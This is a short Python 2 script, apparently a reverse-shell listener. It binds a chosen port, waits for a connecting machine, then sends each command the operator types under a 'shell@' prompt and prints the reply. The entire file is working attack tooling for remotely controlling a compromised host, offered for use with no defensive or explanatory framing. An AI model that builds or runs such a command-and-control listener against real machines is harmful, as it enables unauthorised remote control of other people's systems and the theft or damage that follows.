from socket import socket, AF_INET, SOCK_STREAM
from sys import argv, exit
try:
	from colorama import init
	init()
	blue='\033[01;34m'
	red='\033[01;31m'
	green='\033[01;32m'
	yellow='\033[01;33m'
	white='\033[01;37m'
except ImportError:
	blue=''
	red=''
	green=''
	yellow=''
	white=''
s = socket() #create socket

if len(argv) >= 2:
    port = int(argv[1])
else:
    print 'Usage: listener.py <port>'
    exit()
host = ('', port)
s.bind(host)
s.listen(1)
print '%s[*]%s Listening ' %(blue,white)+'on port %i' % port
while 1:
    try:
        c, addr = s.accept()
        print '%s[+]%s Connection from' %(green,white), addr 
        while True:   
            cmd = raw_input('shell@%s# ' %addr[0])
            if cmd == '':
                pass
            else:
                c.send(cmd)
                print str(c.recv(1024))
    except KeyboardInterrupt:
        break
        exit()
s.close
